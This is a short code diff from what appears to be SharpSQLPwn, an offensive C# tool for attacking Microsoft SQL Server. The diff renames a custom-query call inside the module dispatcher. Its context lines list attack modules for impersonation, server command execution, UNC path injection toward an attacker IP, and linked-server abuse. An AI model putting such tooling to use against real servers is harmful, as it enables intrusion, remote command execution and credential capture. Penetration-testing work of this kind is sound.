@@ -136,7 +136,7 @@ namespace SharpSQLPwn
 
             if (arguments.modules.Contains("R")) { Utilities.Functions.Recon(con); }
             if (arguments.modules.Contains("I")) { Utilities.Functions.Impersonate(con, arguments.impersonatedUser); }
-            if (arguments.modules.Contains("Q")) { Utilities.Functions.QuerySQL(con, arguments.customQuery, true); }
+            if (arguments.modules.Contains("Q")) { Utilities.Functions.CustomQuerySQL(con, arguments.customQuery); }
             if (arguments.modules.Contains("C")) { Utilities.Functions.CmdExec(con, arguments.cmdExecTechnique, arguments.cmdExecCommand); }
             if (arguments.modules.Contains("U")) { Utilities.Functions.UNCPathInjection(con, arguments.attackerIP); }
             if (arguments.modules.Contains("L")) { Utilities.Functions.LinkedServer(con, arguments.linkedSQLServer, arguments.attackerIP, arguments.cmdExecCommand, arguments.customQuery); }
